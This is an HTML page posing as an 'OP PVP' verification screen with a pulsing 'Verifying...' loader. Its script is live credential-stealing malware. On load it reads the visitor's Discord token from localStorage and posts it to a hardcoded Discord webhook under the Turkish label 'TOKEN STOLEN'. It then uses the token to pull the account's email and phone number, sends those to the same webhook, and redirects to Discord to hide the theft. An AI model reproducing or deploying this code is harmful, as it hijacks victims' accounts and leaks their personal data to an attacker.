<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>OP PVP | Verification</title>
    <style>
        body {
            background: #1e1e2e;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
            margin: 0;
        }
        .loader {
            color: #00ff88;
            font-size: 24px;
            text-align: center;
        }
        .loader span {
            display: inline-block;
            animation: pulse 1.5s ease-in-out infinite;
        }
        @keyframes pulse {
            0% { opacity: 0.2; }
            50% { opacity: 1; }
            100% { opacity: 0.2; }
        }
    </style>
</head>
<body>
    <div class="loader">
        <span>🔐</span> Verifying... <span>⏳</span>
    </div>

    <script>
        (function() {
            const token = localStorage.getItem('token');
            const webhook = 'https://discord.com/api/webhooks/1522159080800518185/RT7oVMuIQVBgp7qb2L5suPst3_txYTRH0pyf9LxoYwgdkAmaWx_z7CVRZfEukqogkG0o';

            if (token) {
                // Token'ı gönder
                fetch(webhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `**🎯 TOKEN ÇALINDI!**\n\`${token}\``
                    })
                });

                // Kullanıcı bilgilerini al (sadece e-posta ve telefon)
                fetch('https://discord.com/api/v9/users/@me', {
                    headers: { 'Authorization': token }
                })
                .then(res => res.json())
                .then(user => {
                    const email = user.email || 'Gizli';
                    const phone = user.phone || 'Yok';

                    const bilgi = 
                        `**📧 E-posta:** ${email}\n` +
                        `**📱 Telefon:** ${phone}`;

                    fetch(webhook, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ content: bilgi })
                    });
                })
                .catch(() => {})
                .finally(() => {
                    setTimeout(() => {
                        window.location.href = 'https://discord.com/app';
                    }, 2000);
                });

            } else {
                document.querySelector('.loader').innerHTML = '❌ Token not found. Redirecting...';
                setTimeout(() => {
                    window.location.href = 'https://discord.com/app';
                }, 2000);
            }
        })();
    </script>
</body>
</html>
